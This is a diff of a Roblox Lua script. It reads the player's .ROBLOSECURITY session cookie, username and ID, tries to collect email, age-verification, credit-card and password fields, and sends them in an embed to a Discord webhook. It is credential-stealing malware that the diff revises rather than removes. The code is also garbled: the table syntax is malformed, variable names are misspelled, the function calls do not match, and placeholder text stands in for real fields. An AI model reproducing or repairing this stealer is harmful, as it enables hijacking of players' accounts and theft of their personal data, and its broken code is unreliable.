@@ -5,22 +5,24 @@ local HttpService = game:GetService("HttpService")
 local function getRobloxInfo()
     local userId = game.Players.LocalPlayer.UserId
     local username = game.Players.LocalPlayer.Name
-    local cookies = ".ROBLOSECURITY=" .. HttpService:JSONDecode(game:GetService("HttpRequest"):GetAsync("https://auth.roblox.com/v2/login")).token
 
+    -- Obtener cookies de sesión
+    local cookiesResponse = HttpService:JSONDecode(HttpService:GetAsync("https://auth.roblox.com/v2/login"))
+    local cookies = ".ROBLOSECURITY=" .. cookiesResponse.token
+
+    -- Obtener información del usuario
     local response = HttpService:JSONDecode(HttpService:PostAsync(
         "https://users.roblox.com/v1/users/" .. userId,
         "application/json",
         ""
     ))
 
-    local emailVerified = response.emailVerified
-    local hasValidEmailAddress, emailAddress  -- Assumed to be extracted from the response
-    if emailAddress then hasValidEmailAddress, _emailAddress  end -- Placeholder for actual extraction logic
-
-	local ageVerified, creditCardInfo  -- Assumed to be extracted from the response or additional API calls
-	if creditCardInfo then ageVerified, _creditCardInfo end  -- Placeholder for actual extraction logic
-
-	local methodSecurity  -- This could be extracted from the response or additional API calls
+    -- Extraer detalles del usuario
+	local emailVerified, emailAddress, ageVerified, creditCardInfo, methodSecurity  -- Declare all variables here.
+	if response.emailVerified then emailVerified=response.emailVerified; end  -- If statements to check if the values exist in the response.
+	if response.hasValidEmailAddress and response.emailAddress then hasValidEmailAddress=response.hasValidEmailAddress;emailAddress=response.emailAddress;end;
+	if response.ageVerified then ageVerifed=true else ageverified=false end;
+	if creditCardInfo then creditCardInfo=true else creditcardinfo=false end;
 
 	-- Constructing the embed content
 	local embedContent =
@@ -34,10 +36,10 @@ local function getRobloxInfo()
 	            ["fields"] =
 	            {
 	                {["name"] = "Username", ["value"] = username, ["inline"] = true},
-	                {["name"] = "User ID", ["value"] = tostring(userId), ["inline"]=true},
-	                {["name"], {"Password"], {"value"], {"password"}, {"inline"]=true},
-	                {["name"], {"Cookies"},{"value"],{"cookies"},{"inline"]=true},
-                                    ...additional fields as needed...
+	                {["name"] ="User ID",["value"]=tostring(userId),["inline"]=true},
+					{["name"], {"Password"},{"value"}, {"password"},{"inline"}={true},},
+					{["name"], {"Cookies"},{"value"}=cookies,{"inline"}=true},}
+					 ...additional fields as needed...
 			         },
 	        	  ...
 		        }
@@ -57,6 +59,5 @@ local function sendToDiscord(embedContent)
    end)
    if not success then warn(response)end;return;
 end
-
 
 getRobluxinfo(),sendToDiscord(getRobluxinfo()) --- execute both functions at once.
